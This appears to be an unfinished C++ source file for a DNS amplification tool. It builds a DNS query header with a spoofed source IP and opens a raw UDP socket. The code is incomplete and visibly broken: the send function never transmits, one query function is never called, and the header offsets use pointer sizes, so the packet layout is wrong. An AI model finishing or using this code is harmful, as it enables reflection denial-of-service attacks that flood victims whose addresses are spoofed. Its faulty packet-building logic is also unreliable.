#include "dnsamp.h"

void PrintError(string error){
	cerr<<error<<endl;
	exit(-1);
}

void SendDnsPacket(string dnsip, string spoofip, int port){
	int sd;
	char buf[PACKET_LENGTH];

	ih *ipheader = (ih *)buf;
	uh *udpheader = (uh *)(buf + sizeof(ipheader));
	dh *dnsheader = (dh *)(buf + sizeof(udpheader) + sizeof(ipheader));
	query *Query = (query *)(buf + sizeof(dnsheader) + sizeof(udpheader) + sizeof(ipheader));

	CreateDnsHeader(dnsheader);

	sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
	if(sd < 0){
		PrintError("socket error");
	}

}

void CreateDnsHeader(dh *dns){
	dns->query_id = (unsigned short) htons(getpid());
	dns->addrr = 0;
	dns->anscount = 0;
	dns->authrr = 0;
	dns->flags = 0;
	dns->qcount = htons(1);
}

void CreateQueryInfo(query *q){
	q->dnsq_class = htons(1);
	q->dnsq_type = htons(1);
}

// Calculate UDP checksum
unsigned short CheckUdpSum(int length, unsigned short *ptr){
	ih *ipheader = (ih *)ptr;
	uh *udpheader = (uh *)(ptr + sizeof(ipheader));
	udpheader->check = 0;
	unsigned long sum = 0;

	sum = CheckSum(8, (unsigned short *)ipheader->saddr);
	sum += CheckSum(length, (unsigned short *)udpheader);
	sum += ntohs(length + IPPROTO_UDP);

	sum = (sum >> 16) + (sum & 0xffff);
	sum = sum + (sum >> 16);

	return (unsigned short)~sum;

}

unsigned int CheckSum(int size, unsigned short *ptr){
	unsigned int cksum;
	for(cksum = 0; size > 1; size -= 2){
		cksum += *ptr++;
	}
	if(size == 1){
		cksum += *(unsigned short *)ptr;
	}
	return cksum;
}